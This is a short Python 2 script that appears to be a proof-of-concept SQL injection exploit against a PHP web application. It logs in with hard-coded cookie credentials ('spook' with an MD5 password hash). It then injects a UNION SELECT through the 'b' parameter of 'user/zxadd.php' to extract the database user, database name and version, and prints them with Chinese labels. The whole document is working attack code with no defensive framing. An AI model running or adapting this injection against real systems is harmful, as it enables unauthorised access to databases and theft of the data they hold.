# -*- coding=utf-8 -*-
import requests
import hashlib
import re

cookies = {
  "UserName":"spook",
  "PassWord":hashlib.md5("spook").hexdigest()
}

cont = ["user()","database()","version()"]
explain = ["用户名是:","数据库名是:","PHP版本是:"]
pattern = re.compile(r">([a-z0-9].*?[a-z0-9])</option>")
for i in xrange(len(cont)):
   url = "http://localhost/user/zxadd.php?b=0 union select 1,{cont},3,4,5,6,7,8,9,10%23".format(cont=cont[i])
   r = requests.get(url, cookies=cookies, timeout=5)
   print "[+] "+explain[i]+re.search(pattern,r.content).group(1)